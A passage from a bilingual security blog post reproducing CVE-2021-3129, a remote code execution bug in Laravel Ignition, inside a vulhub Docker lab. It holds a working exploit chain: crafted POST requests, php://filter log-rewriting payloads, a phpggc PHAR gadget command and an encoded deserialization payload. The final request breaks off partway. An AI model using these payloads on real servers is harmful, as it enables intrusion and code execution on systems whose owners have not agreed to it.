<!DOCTYPE html>












  


<html class="theme-next gemini use-motion" lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">

















  <meta name="baidu-site-verification" content="wD6I1h8lGi">









<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">

<link rel="stylesheet" href="/css/main.css?v=7.1.2">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.2">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.2">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.2">


  <link rel="mask-icon" href="/images/logo.svg?v=7.1.2" color="#222">







<script id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '7.1.2',
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
    back2top: true,
    back2top_sidebar: false,
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="This article is written in Chinese and English, and the content is exactly the same. To view the Chinese version, please scroll down. 本篇文章采用中文和英文两种语言编写，内容完全相同。如需查看中文版请下滑。 Research on CVE-2021-3129Sett">
<meta property="og:type" content="article">
<meta property="og:title" content="Research on CVE-2021-3129&#x2F;CVE-2021-3129详解">
<meta property="og:url" content="http://ama666.cn/2021/05/19/Research on CVE-2021-3129/index.html">
<meta property="og:site_name" content="ama666">
<meta property="og:description" content="This article is written in Chinese and English, and the content is exactly the same. To view the Chinese version, please scroll down. 本篇文章采用中文和英文两种语言编写，内容完全相同。如需查看中文版请下滑。 Research on CVE-2021-3129Sett">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519214715.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519202630.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519202653.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519202818.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519202841.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519203019.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519203102.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519203125.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519203206.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519203236.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519214715.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519202630.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519202653.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519202818.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519202841.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519203019.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519203102.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519203125.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519203206.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519203236.png">
<meta property="og:updated_time" content="2021-10-23T03:01:07.152Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Research on CVE-2021-3129&#x2F;CVE-2021-3129详解">
<meta name="twitter:description" content="This article is written in Chinese and English, and the content is exactly the same. To view the Chinese version, please scroll down. 本篇文章采用中文和英文两种语言编写，内容完全相同。如需查看中文版请下滑。 Research on CVE-2021-3129Sett">
<meta name="twitter:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519214715.png">





  
  
  <link rel="canonical" href="http://ama666.cn/2021/05/19/Research on CVE-2021-3129/">



<script id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>Research on CVE-2021-3129/CVE-2021-3129详解 | ama666</title>
  












  <noscript>
  <style>
  .use-motion .motion-element,
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-title { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">ama666</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
      
        <p class="site-subtitle">平时多喝点茶</p>
      
    
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="切换导航栏">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">

    
    
    
      
    

    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-about">

    
    
    
      
    

    

    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">

    
    
    
      
    

    

    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">

    
    
    
      
    

    

    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">

    
    
    
      
    

    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-sitemap">

    
    
    
      
    

    

    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>

  </li>

      
      
    </ul>
  

  

  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://ama666.cn/2021/05/19/Research on CVE-2021-3129/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="安大侠">
      <meta itemprop="description" content="每天挣扎的活着">
      <meta itemprop="image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190616124508.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ama666">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Research on CVE-2021-3129/CVE-2021-3129详解

              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2021-05-19 19:27:42" itemprop="dateCreated datePublished" datetime="2021-05-19T19:27:42+08:00">2021-05-19</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">更新于</span>
                
                <time title="修改时间：2021-10-23 11:01:07" itemprop="dateModified" datetime="2021-10-23T11:01:07+08:00">2021-10-23</time>
              
            
          </span>

          

          
            
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="post-meta-item-icon">
            <i class="fa fa-eye"></i>
             阅读次数： 
            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
            </span>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>This article is written in Chinese and English, and the content is exactly the same. To view the Chinese version, please scroll down.</p>
<p>本篇文章采用中文和英文两种语言编写，内容完全相同。如需查看中文版请下滑。</p>
<h1 id="Research-on-CVE-2021-3129"><a href="#Research-on-CVE-2021-3129" class="headerlink" title="Research on CVE-2021-3129"></a>Research on CVE-2021-3129</h1><h2 id="Setting-up-the-environment"><a href="#Setting-up-the-environment" class="headerlink" title="Setting up the environment"></a>Setting up the environment</h2><p>Use China daocloud to install docker with one click.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL &lt;https://get.daocloud.io/docker&gt; | sh</span><br></pre></td></tr></table></figure>

<p>Also install pip.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s &lt;https://bootstrap.pypa.io/get-pip.py&gt; | python3</span><br></pre></td></tr></table></figure>

<p>After installing pip, use pip to install docker-compose.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install docker-compose</span><br></pre></td></tr></table></figure>

<p>After the installation is complete, use the following command to test whether the installation is successful.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker version</span><br><span class="line">docker-compose</span><br></pre></td></tr></table></figure>

<p>Use the file on vluhub to find CVE-2021-3129, and download the corresponding environment file according to the tutorial on github. Just follow the tutorial on vulhub.</p>
<p><a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">https://github.com/vulhub/vulhub</a></p>
<p>This time we reproduced the loopholes in the Laravel framework and entered the corresponding path. First check the README document, the default setting of Laravel is open on port 8080. I used Alibaba Cloud’s ECS to build, so I have to set up port 8080 to accept traffic in the security policy on the Alibaba Cloud console.</p>
<h2 id="Exploitation-process"><a href="#Exploitation-process" class="headerlink" title="Exploitation process"></a>Exploitation process</h2><p>The reproduction process has very detailed instructions in the README. According to the reproduction process, it is first necessary to send a data packet to the ignition component. In fact, Ignition is Laravel’s own Debug page. The native PHP error reporting obviously cannot meet the requirements, so Ignition is actually Laravel’s own error reporting page that provides a lot of functions. The Solution is very easy to use, allowing developers to fix some bugs with a few clicks. Don’t care about the specific functions, just know that the vulnerability entry for this time is here.</p>
<p>Because this vulnerability environment is built with docker, it is best to enter the mount directory corresponding to the docker container on the server side to facilitate viewing the process of website logs being operated.</p>
<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519214715.png" alt></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">Find the id of the running container that needs to enter the directory</span></span><br><span class="line">docker ps -a</span><br><span class="line"><span class="meta">#</span><span class="bash">Enter the directory of the container:</span></span><br><span class="line">docker exec -it container id /bin/bash</span><br><span class="line"><span class="meta">#</span><span class="bash">You can check the current path</span></span><br><span class="line">pwd</span><br><span class="line">ls -al</span><br></pre></td></tr></table></figure>

<p>First, in order to verify the existence of the vulnerability, send the following data packet</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: IP:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 168</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  "solution": "Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution",</span><br><span class="line">  "parameters": &#123;</span><br><span class="line">    "variableName": "username",</span><br><span class="line">    "viewFile": "xxxxxxx"</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>If <code>500</code> is returned and an error page appears, you can see such code from the Debug page that was directly exposed, proving that the vulnerability exists. <code>File_get_content is a function</code> often seen in php vulnerabilities. This function supports the php pseudo-protocol, which will cause file inclusion.</p>
<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519202630.png" alt></p>
<p>Send the following data packet to clear the log file.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: IP:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 330</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode /resource=../storage/logs/laravel.log&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>A return of 200 indicates that the removal was successful.</p>
<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519202653.png" alt></p>
<p>Use phpggc to generate serialization and use POC. If you don’t have phpggc installed, you need to install it. phpggc is a tool that can automatically generate serialized test payloads for mainstream frameworks. When using this command, you need to be in the phpggc path.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -d "phar.readonly=0" ./phpggc Laravel/RCE5 "%s" --phar phar -o php://output | base64 -w 0 | python3 -c "import sys;print(".join (['=' + hex (ord(i))[2:] +'=00' for i in sys.stdin.read()]).upper())"</span><br></pre></td></tr></table></figure>

<p>POC:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=6F=00=6D=00=41=00=67=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=44=00=50=00=41=00=51=00=41=00=41=00=54=00=7A=00=6F=00=30=00=4D=00=44=00=6F=00=69=00=53=00=57=00=78=00=73=00=64=00=57=00=31=00=70=00=62=00=6D=00=46=00=30=00=5A=00=56=00=78=00=43=00=63=00=6D=00=39=00=68=00=5A=00=47=00=4E=00=68=00=63=00=33=00=52=00=70=00=62=00=6D=00=64=00=63=00=55=00=47=00=56=00=75=00=5A=00=47=00=6C=00=75=00=5A=00=30=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=43=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=64=00=48=00=4D=00=69=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=56=00=7A=00=58=00=45=00=52=00=70=00=63=00=33=00=42=00=68=00=64=00=47=00=4E=00=6F=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=59=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=46=00=31=00=5A=00=58=00=56=00=6C=00=55=00=6D=00=56=00=7A=00=62=00=32=00=78=00=32=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=54=00=47=00=39=00=68=00=5A=00=47=00=56=00=79=00=58=00=45=00=56=00=32=00=59=00=57=00=78=00=4D=00=62=00=32=00=46=00=6B=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=41=00=36=00=65=00=33=00=31=00=70=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=30=00=4F=00=69=00=4A=00=73=00=62=00=32=00=46=00=6B=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=5A=00=58=00=5A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=67=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=4A=00=76=00=59=00=57=00=52=00=6A=00=59=00=58=00=4E=00=30=00=61=00=57=00=35=00=6E=00=58=00=45=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=45=00=56=00=32=00=5A=00=57=00=35=00=30=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=45=00=77=00=4F=00=69=00=4A=00=6A=00=62=00=32=00=35=00=75=00=5A=00=57=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=4D=00=79=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=4E=00=72=00=5A=00=58=00=4A=00=35=00=58=00=45=00=64=00=6C=00=62=00=6D=00=56=00=79=00=59=00=58=00=52=00=76=00=63=00=6C=00=78=00=4E=00=62=00=32=00=4E=00=72=00=52=00=47=00=56=00=6D=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=76=00=62=00=69=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6A=00=62=00=32=00=35=00=6D=00=61=00=57=00=63=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=52=00=32=00=56=00=75=00=5A=00=58=00=4A=00=68=00=64=00=47=00=39=00=79=00=58=00=45=00=31=00=76=00=59=00=32=00=74=00=44=00=62=00=32=00=35=00=6D=00=61=00=57=00=64=00=31=00=63=00=6D=00=46=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=35=00=68=00=62=00=57=00=55=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=57=00=4A=00=6A=00=5A=00=47=00=56=00=6D=00=5A=00=79=00=49=00=37=00=66=00=58=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=32=00=39=00=6B=00=5A=00=53=00=49=00=37=00=63=00=7A=00=6F=00=7A=00=4D=00=6A=00=6F=00=69=00=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=4B=00=43=00=64=00=33=00=61=00=47=00=39=00=68=00=62=00=57=00=6B=00=6E=00=4B=00=54=00=73=00=67=00=5A=00=58=00=68=00=70=00=64=00=44=00=73=00=67=00=50=00=7A=00=34=00=69=00=4F=00=33=00=31=00=39=00=66=00=51=00=55=00=41=00=41=00=41=00=42=00=6B=00=64=00=57=00=31=00=74=00=65=00=51=00=51=00=41=00=41=00=41=00=41=00=30=00=67=00=61=00=52=00=67=00=42=00=41=00=41=00=41=00=41=00=41=00=78=00=2B=00=66=00=39=00=69=00=6B=00=41=00=51=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=30=00=5A=00=58=00=4E=00=30=00=4C=00=6E=00=52=00=34=00=64=00=41=00=51=00=41=00=41=00=41=00=41=00=30=00=67=00=61=00=52=00=67=00=42=00=41=00=41=00=41=00=41=00=41=00=78=00=2B=00=66=00=39=00=69=00=6B=00=41=00=51=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=52=00=30=00=5A=00=58=00=4E=00=30=00=4B=00=43=00=63=00=56=00=36=00=44=00=48=00=36=00=4F=00=39=00=6F=00=37=00=61=00=7A=00=48=00=6C=00=43=00=42=00=46=00=64=00=71=00=61=00=39=00=46=00=78=00=7A=00=4D=00=43=00=41=00=41=00=41=00=41=00=52=00=30=00=4A=00=4E=00=51=00=67=00=3D=00=3D=00a</span><br></pre></td></tr></table></figure>

<p>Then send the following data packet, add a prefix <strong>AA</strong> to log to align.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: IP:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 165</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  "solution": "Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution",</span><br><span class="line">  "parameters": &#123;</span><br><span class="line">    "variableName": "username",</span><br><span class="line">    "viewFile": "AA"</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519202818.png" alt></p>
<p>The next step is to write the payload into the log file.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: IP:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 5129</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  "solution": "Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution",</span><br><span class="line">  "parameters": &#123;</span><br><span class="line">    "variableName": "username",</span><br><span class="line">    "viewFile": "Payload above"&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519202841.png" alt></p>
<p>After writing the payload, clear other characters and decode the payload.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: IP:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 330</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode /resource=../storage/logs/laravel.log&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Finally, the deserialization is triggered and the payload is executed.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: IP:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Conne</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210519203019.png" alt></p>
<h2 id="Vulnerability-principle"><a href="#Vulnerability-principle" class="headerlink" title="Vulnerability principle"></a>Vulnerability principle</h2><p>The most core principle is deserialization, but every deserialization has a fancy entrance. During the pentest a few days ago, it was found that the operations of low-privileged users were recorded in the log and could be audited by the administrator. At the time, I was thinking to see if I could do XSS or something, but the filtering was done very well and it was unsuccessful. This vulnerability gives a lot of ideas. Attackers can write almost any character in the log and trigger serialization to realize remote code execution.</p>
<p>Among them, encoding and decoding are involved, and the handling of different characters in this one gives an opportunity to exploit this vulnerability. I use a CTF question as an example.</p>
